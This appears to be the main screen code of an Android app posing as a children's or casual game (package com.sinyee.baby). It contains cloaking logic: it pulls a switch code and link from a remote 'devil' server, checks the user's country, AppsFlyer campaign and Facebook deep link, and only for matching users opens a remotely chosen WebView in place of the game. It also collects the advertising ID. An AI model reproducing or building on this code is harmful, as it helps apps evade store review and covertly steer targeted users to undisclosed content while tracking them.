package com.sinyee.baby

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.sinyee.baby.ApplicaClaaass.Companion.MAIN_CHECKER
import com.sinyee.baby.ApplicaClaaass.Companion.keyCodeFromHost
import com.sinyee.baby.ApplicaClaaass.Companion.keyDEEPLINK
import com.sinyee.baby.ApplicaClaaass.Companion.keyGeo
import com.sinyee.baby.ApplicaClaaass.Companion.keyLinkaa
import com.sinyee.baby.ApplicaClaaass.Companion.keyMAIN_ID
import com.sinyee.baby.ApplicaClaaass.Companion.keyMainForSharedPref
import com.sinyee.baby.ApplicaClaaass.Companion.keyNaming
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : AppCompatActivity(), Navigator {

    val applicaClaaass = ApplicaClaaass()

    private val volleyApiClient by lazy {
        VolleyApiClient(applicationContext)
    }

    private val sharedPreferences by lazy {
        getSharedPreferences(keyMainForSharedPref, MODE_PRIVATE)
    }

    private var codeFromDevilHost: String = ""
    private var userCurrentGeo: String = ""
    private var naming: String = ""
    private var deepLink: String = ""
    private var linka: String = ""
    private var mainId: String = ""
    private var listOfGeo: String = ""

    private var tempDevilLoad: String? = null
    private var tempGeoLoad: String? = null
    private var tempNamingLoad: String? = null
    private var tempDeepLoad: String? = null

    private fun readAllFromSharedPref() {
        codeFromDevilHost = readFromSharedPref(keyCodeFromHost, ApplicaClaaass.keyForNullData)
        naming = readFromSharedPref(keyNaming, ApplicaClaaass.keyForNullData)
        deepLink = readFromSharedPref(keyDEEPLINK, ApplicaClaaass.keyForNullData)
        linka = readFromSharedPref(keyLinkaa, ApplicaClaaass.keyForNullData)
        mainId = readFromSharedPref(keyMAIN_ID, ApplicaClaaass.keyForNullData)
    }

    private fun saveAllDataToSharedPref() {
        saveToSharedPref(keyCodeFromHost, codeFromDevilHost)
        saveToSharedPref(keyNaming, naming)
        saveToSharedPref(keyDEEPLINK, deepLink)
        saveToSharedPref(keyLinkaa, linka)
        saveToSharedPref(keyMAIN_ID, mainId)
    }

    private suspend fun getDevilData() {
        val devilData = volleyApiClient.getDevilApi()
            linka = devilData.viewD
            listOfGeo = devilData.geoD
            codeFromDevilHost = devilData.appsCheckerD

            saveToSharedPref(keyLinkaa, linka)
            saveToSharedPref(keyGeo, userCurrentGeo)
            saveToSharedPref(keyCodeFromHost, codeFromDevilHost)
            tempDevilLoad = "loaded"

    }

    private suspend fun getGeoData() {
        val apiData = volleyApiClient.getGeoData()
            userCurrentGeo = apiData.countryCode
            tempGeoLoad = "loaded"
    }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        getDeep(this@MainActivity)
        readAllFromSharedPref()

        lifecycleScope.launch {
            withContext(Dispatchers.Default){
                getAdvertisingIdClient()
            }
            getDevilData()
            getGeoData()

            while (true) {
                if (tempDevilLoad != null && tempGeoLoad != null) {
                    Log.d("lolo", "tempDevilLoad/tempGeoLoad != null")
                    break
                } else {
                    Log.d("lolo", "tempDevilLoad/tempGeoLoad == null")
                    delay(1000)
                }
            }
            when (codeFromDevilHost) {
                "0" -> {
                    goToGame()
                }
                "1" -> {
                    //Fb + Apps
                    initAppsFlyerLibeer(this@MainActivity)
                    while (true) {
                        if (tempNamingLoad != null && tempDeepLoad != null) {
                            Log.d("lolo", "tempDeepLoad/tempNamingLoad NOT null")
                            if (applicaClaaass.makeCheckNamingDeepGeo(
                                    naming = naming,
                                    deep = deepLink,
                                    userGeo = userCurrentGeo,
                                    listAllGeo = listOfGeo,
                                    checker = MAIN_CHECKER
                                )
                            ){
                                saveAllDataToSharedPref()
                                goToVebViev(
                                    keyCodeFromHost = codeFromDevilHost!!,
                                    naming = naming,
                                    deepLink = deepLink!!,
                                    linka = linka!!,
                                    mainId = mainId!!
                                )
                            }else{
                                goToGame()
                            }


                            break
                        } else {
                            Log.d("lolo", "tempDeepLoad/tempNamingLoad == null")
                            delay(1000)
                        }
                    }
                }
            }
        }
    }

    override fun goToVebViev(
        keyCodeFromHost: String,
        naming: String,
        deepLink: String,
        linka: String,
        mainId: String
    ) {
        Intent(this@MainActivity, VebVActivity::class.java).apply {
            putExtra(keyCodeFromHost, keyCodeFromHost)
            putExtra(keyNaming, naming)
            putExtra(keyDEEPLINK, deepLink)
            putExtra(keyLinkaa, linka)
            putExtra(keyMAIN_ID, mainId)
            startActivity(this)
        }
        finish()
    }

    override fun goToGame() {
        Intent(this@MainActivity, GamerActivity::class.java).also {
            startActivity(it)
        }
        finish()
    }

    override fun saveToSharedPref(key: String, valuue: String?) {
            sharedPreferences.edit().apply {
                putString(key, valuue)
            }.apply()
    }

    override fun readFromSharedPref(key: String, defValue: String): String {
        return sharedPreferences.getString(key, defValue)?:"null"
    }

    private fun getAdvertisingIdClient() {
        val advertisingIdClient = AdvertisingIdClient(applicationContext)
        advertisingIdClient.start()
        val infofrrrf = advertisingIdClient.info.id
        mainId = infofrrrf.toString()
    }

    private fun initAppsFlyerLibeer(context: Context) {
        AppsFlyerLib.getInstance()
            .init(ApplicaClaaass.appsCode, conversionDataListener, context)
        Log.d("lolo", "initAppsFlyerLibeer")
        AppsFlyerLib.getInstance().start(context)
    }

    private val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            Log.d("lolo", "onConversionDataSuccess before loading")
            val dataGotten = data?.get("campaign").toString().apply {
                naming = this
                tempNamingLoad = this
                Log.d("lolo", "onConversionDataSuccess")
            }
        }

        override fun onConversionDataFail(p0: String?) {
            Log.d("lolo", "onConversionDataFail")
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
            Log.d("lolo", "onAppOpenAttribution")
        }

        override fun onAttributionFailure(p0: String?) {
            Log.d("lolo", "onAttributionFailure")
        }
    }

    private fun getDeep(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                appLinkData.targetUri.host.toString().apply {
                    deepLink = this
                    tempDeepLoad = this
                }
                Log.d("lolo", "getDeep loaded")
            }
            if (appLinkData == null) {
                tempDeepLoad = "null"
                if (deepLink == "null"){
                    deepLink = "null"
                }
            }
        }
    }
}